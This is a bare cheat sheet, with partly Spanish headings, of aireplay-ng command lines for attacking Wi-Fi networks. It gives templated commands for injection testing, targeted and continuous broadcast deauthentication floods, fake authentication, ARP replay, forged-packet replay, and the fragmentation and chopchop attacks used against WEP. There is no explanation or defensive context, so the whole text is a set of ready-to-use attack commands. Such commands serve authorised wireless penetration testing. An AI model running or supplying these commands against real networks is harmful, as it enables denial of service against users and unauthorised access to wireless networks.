### Pruebas de inyección y calidad:
$ aireplay-ng --test {INTERFACE}
### Desautenticación dirigida:
$ aireplay-ng -0 10 -a {BSSID-AP} -c {CLIENT-MAC} {INTERFACE}
### Desautentificación global:
$ aireplay-ng -0 0 -e {ESSID-AP} -c FF:FF:FF:FF:FF:FF {INTERFACE}
$ aireplay-ng -0 0 -e {ESSID-AP} {INTERFACE}
$ aireplay-ng -0 0 -a {BSSID-AP} {INTERFACE}
### Fake Authentication Attack:
$ aireplay-ng -1 0 -e {ESSID-AP} -a {BSSID-AP} -h {YOUR_MAC} {INTERFACE}
### ARP Replay Attack:
$ aireplay-ng -3 -b {BSSID-AP} -h {YOUR-MAC} {INTERFACE}
### Interactive Packet replay Attack:
$ aireplay-ng -2 -b {BSSID-AP} -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 {INTERFACE}
$ aireplay-ng -2 -r replay_src-{FILE_NAME.cap} {INTERFACE}
### Interactive Packet Replay Attack with the forge ARP packet:
$ aireplay-ng -2 -r {ARP_PACKET_NAME} {INTERFACE}
### Fragmentation Attack:
$ aireplay-ng -5 -b {BSSID-AP} -h {YOUR-MAC} {INTREFACE}
### Chop chop Attack:
$ aireplay-ng -4 -b {BSSID-AP} -h {YOUR-MAC} {INTERFACE}